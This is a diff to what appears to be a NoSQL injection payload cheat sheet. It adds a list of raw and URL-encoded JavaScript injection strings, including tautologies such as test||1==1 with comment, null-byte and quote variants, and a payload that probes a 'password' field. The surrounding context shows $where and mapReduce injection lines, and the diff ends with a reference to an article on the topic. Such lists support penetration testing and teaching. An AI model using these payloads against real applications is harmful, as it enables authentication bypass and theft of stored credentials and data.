@@ -213,7 +213,35 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 "$where":"Object.keys(this)[1].match('^.{}.*')"
 "$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"
 ```
+```
+test||1==1
+test%7C%7C1%3D%3D1
 
+test||1==1//
+test%7C%7C1%3D%3D1%2F%2F
+
+test||1==1%00
+test%7C%7C1%3D%3D1%2500
+
+test||1==1\u0000
+test%7C%7C1%3D%3D1%5Cu0000
+
+test||'1==1
+test%7C%7C%271%3D%3D1
+
+test||'1'=='1'
+test%7C%7C%271%27%3D%3D%271%27
+
+test||'1'=='1
+test%7C%7C%271%27%3D%3D%271
+
+test'||1||'
+test%27%7c%7c%31%7c%7c%27
+
+<!-- Find specific fields e.g. 'password' -->
+admin' && this.password!='
+admin'+%26%26+this.password!%3d'
+```
 ## References
 
 * [Les NOSQL injections Classique et Blind: Never trust user input - Geluchat](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
